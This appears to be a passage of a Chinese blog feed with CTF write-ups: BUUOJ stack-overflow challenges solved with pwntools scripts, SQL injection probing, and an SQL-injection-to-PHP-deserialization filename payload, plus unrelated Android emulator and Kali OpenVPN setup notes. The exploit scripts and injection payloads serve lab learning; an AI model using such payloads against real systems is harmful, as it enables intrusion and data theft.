gets栈溢出，满足条件</strong></p><p>又是一道gets的题，找到关键处的代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>v2 == 11.28125</code>即可获得flag，先看总的容量为<code>0x30</code>个字节的大小。</p><p>然后是将空间分成的是v1和v2两个部分，共是<code>0x30</code>，v2的大小为<code>0x4</code>。目标就是把v2这一块空间内的数据写成<code>11.28125</code>转为十六进制是<code>0x41348000</code>。</p><p>然后利用脚本就是下面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27852</span>)</span><br><span class="line"></span><br><span class="line">buf_1 = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x30</span> - <span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;652624f4-f9cc-498c-a675-42a5143e9b49&#125;</span></span><br></pre></td></tr></table></figure><h4 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h4><p><strong>TAG: 替换字符造成栈溢出</strong></p><p>这个对gets到的字符的个数有了限制，但是<code>strcpy(s, v0);</code>，v0可控似乎是，下面是反汇编出来的主要的c代码，说实话我没怎么看懂。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, v3, v6, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里网上的教程说是前面间接有个对传入的内容有一个把<code>I</code>换成<code>you</code>的替换操作，这里就可以间接地造成栈溢出，感觉就像是web里面的<code>php反序列化的字符逃逸</code>，然后看看s的空间分配的大小是<code>0x3c</code></p><p><img src="/2021/05/28/CTF//image-20210718102812281.png"></p><p>然后<code>0x3c = 16x3+12 = 60</code>，传入<code>20</code>个<code>I</code>即可，可写payload如下</p><p><img src="/2021/05/28/CTF//image-20210718103142615.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25512</span>)</span><br><span class="line"></span><br><span class="line">buf_1 = <span class="string">b&quot;I&quot;</span> * <span class="number">20</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">4</span> + p64(<span class="number">0x08048F0D</span>)  <span class="comment"># 好像是因为32位的返回地址是4个字节，需要填充4个字符a</span></span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;3ef70652-fbd5-4ee2-a6d0-b94061892eb1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h4 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h4><p><strong>TAG: read造成buf缓冲区溢出</strong></p><p>看有的wp说是read函数造成缓冲区溢出，下面是主要的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这个buf的大小是<code>0x80</code>也就是十进制的<code>128</code>，然后缓冲区溢出就是将栈的返回地址改成后门函数的地址，注意到数据栈的返回地址<code>(r)</code>是<code>0x8</code></p><p><img src="/2021/05/28/CTF//image-20210718125634274.png"></p><p>然后后门函数的地址为<code>0x400596</code></p><p><img src="/2021/05/28/CTF//image-20210718125729564.png"></p><p>所以利用方式如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25015</span>)</span><br><span class="line"></span><br><span class="line">buf_1 = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;3d0a1531-3486-4d69-aa6a-010088aa45bf&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h4><p>**TAG: **</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
            <tag> misc </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>swpu2019-web4</title>
      <link href="/2021/03/25/swpu2019-web4/"/>
      <url>/2021/03/25/swpu2019-web4/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入判定"><a href="#sql注入判定" class="headerlink" title="sql注入判定"></a>sql注入判定</h2><p>给的是个登录界面，并且没有开放注册功能，登录键点了也没反应，抓包</p><p><img src="/2021/03/25/swpu2019-web4//image-20210326002616701.png" alt="登录界面"></p><p><strong>这种登录界面的一般就是sql注入了</strong></p><p><img src="/2021/03/25/swpu2019-web4//image-20210326003204466.png" alt="抓包得到的图如下"></p><p>当username字段的值为<code>1&#39;</code>时，响应报错了，而当username为<code>1&#39;&#39;</code>时，报错又消失了，应该就是单引号闭合的sql注入。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将AndroidStudio连接到雷电模拟器</title>
      <link href="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
      <url>/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="如何将AndroidStudio连接到雷电模拟器"><a href="#如何将AndroidStudio连接到雷电模拟器" class="headerlink" title="如何将AndroidStudio连接到雷电模拟器"></a>如何将AndroidStudio连接到雷电模拟器</h1><h2 id="1-先下载好雷电模拟器"><a href="#1-先下载好雷电模拟器" class="headerlink" title="1.先下载好雷电模拟器"></a>1.先下载好雷电模拟器</h2><p>直接浏览器搜，然后再在官网下载安装。</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8//image-20210323234804382.png" alt="image-20210323234804382"></p><h2 id="2-模拟器设置"><a href="#2-模拟器设置" class="headerlink" title="2.模拟器设置"></a>2.模拟器设置</h2><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8//image-20210324000947774.png" alt="image-20210324000947774"></p><p>先进开发者模式(点击5次版本号即可)，然后打开usb调试</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8//image-20210324001100019.png" alt="image-20210324001100019"></p><p><strong>然后进入雷电模拟器的文件打开位置，打开powershell，输入如下图所示的命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./adb.exe connect 127.0.0.1</span><br></pre></td></tr></table></figure><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8//image-20210324001247485.png" alt="image-20210324001247485" style="zoom:150%;"><h2 id="3-android-studio设置"><a href="#3-android-studio设置" class="headerlink" title="3.android studio设置"></a>3.android studio设置</h2><p>然后进入android studio软件里面直接run起来创建好的空白项目，直接as就能帮忙连接到雷电模拟器上面运行了，嘿嘿。</p><p>emmm，说下体验吧，比as自带的那些个模拟器个人感觉好多了有木有，自带的我用着真的卡到爆。。。</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8//image-20210324001721110.png" alt="image-20210324001721110"></p><h2 id="4-需要注意的点"><a href="#4-需要注意的点" class="headerlink" title="4.需要注意的点"></a>4.需要注意的点</h2><ul><li>在命令行里面执行命令之前要打开两个软件</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装openvpn</title>
      <link href="/2021/03/18/kali%E5%AE%89%E8%A3%85openvpn/"/>
      <url>/2021/03/18/kali%E5%AE%89%E8%A3%85openvpn/</url>
      
        <content type="html"><![CDATA[<p>被csdn卡了，emmm想了想应该是openvpn的问题，特此记录到博客里面，ps本人遵纪守法热爱祖国。</p><h3 id="配置kali游戏环境"><a href="#配置kali游戏环境" class="headerlink" title="配置kali游戏环境"></a>配置kali游戏环境</h3><p>首先要在kali里面安装一个openvpn的工具，根据大哥的教程有下面的配置步骤<br>openvpn配置<br>在kali下安装这几个源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get install network-manager-openvpn</span><br><span class="line">apt-get install network-manager-openvpn-gnome</span><br><span class="line">apt-get install network-manager-pptp</span><br><span class="line">apt-get install network-manager-pptp-gnome</span><br><span class="line">apt-get install network-manager-strongswan</span><br><span class="line">apt-get install network-manager-vpnc</span><br><span class="line">apt-get install network-manager-vpnc-gnome</span><br></pre></td></tr></table></figure><p>在access页面点击here下载openvpn配置文件<br><a href="https://www.hackthebox.eu/home/htb/access/ovpnfile">https://www.hackthebox.eu/home/htb/access/ovpnfile</a><br>使用命令：xxxx.ovpn是下载好的配置文件,这里要用root权限运行。<br>sudo oepnvpn –config xxxx.ovpn<br>连接成功后会在access页面看到connected打勾：<br><img src="https://img-blog.csdnimg.cn/20210316143646812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5neGlhbnNoZW5nMTI=,size_16,color_FFFFFF,t_70" alt="HTB安装openvpn并连接成功"></p><p>就像这样，特别炫酷啊有没有，machine我没搞出来，wtcl，做个misc吧，这个题库还是太复杂了(主要是英语我看不懂tmd)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> openvpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 不是文件上传</title>
      <link href="/2021/03/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/03/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>什么信息泄露？在哪里可以看到信息泄露？我都扫出东方明珠塔了还没发现信息泄露呜呜，原来信息就在主页的下，小丑竟是我自己。。。<code>Powered By wowouploadimage © 20014-2019, All right reserved.</code>，这里的<code>wowouploadimage</code>是一套模板，先要搞一套源码，然后再分析。<br><a href="https://github.com/Threezh1/wowouploadimage">wowouploadimage源码下载</a><br>这里面的重要利用点是下面的几句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br></pre></td></tr></table></figure><p>$title就是没有后缀名的文件名，并且很明显没有做任何过滤。再看对数据库的操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>上面的foreach好像是将<code>\0\0\0</code>替换为了<code>chr(0)*chr(0)</code>，而后面的代替又将<code>attr</code>中的<code>chr(0)*chr(0)</code>变成了<code>\0\0\0</code>，正常的sql语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (`title`,`filename`,`ext`,`path`,`attr`) <span class="keyword">VALUES</span>(<span class="string">&#x27;TIM截图20191102114857&#x27;</span>,<span class="string">&#x27;f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>由于title可由我们控制，没有处理，可以直接换成<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)#.jpg</code>，后面的反序列化后的内容就可由我们进行改变了，触发的时候，由于销毁前执行析构函数，从而有调用到<code>view_files()函数</code>执行危险函数<code>file_get_contents();</code>，故php的序列化内容应为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">TRUE</span>; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:6:&quot;helper&quot;:2:&#123;s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是这里的protected变量的<code>*</code>被替换掉了的问题，就把<code>*</code>变成<code>\0\0\0</code>就行了，就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;&#x27;)#.jpg</span><br></pre></td></tr></table></figure><p>试试先，bp抓包改filename，emmm双引号会被提前截断，可换成单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;&#x27;)#.jpg</span><br></pre></td></tr></table></figure><p>显示something wrong，显然是因为我们的格式不对从而触发了该点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有将后面的序列化内容转为hex了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure><p>用下面的payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.jpg</span><br></pre></td></tr></table></figure><p><code>flag&#123;8894c4be-81c8-4b1f-bf86-e1a1d21f73f6&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> buu </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018_Unfinish</title>
      <link href="/2021/03/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
      <url>/2021/03/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</url>
      
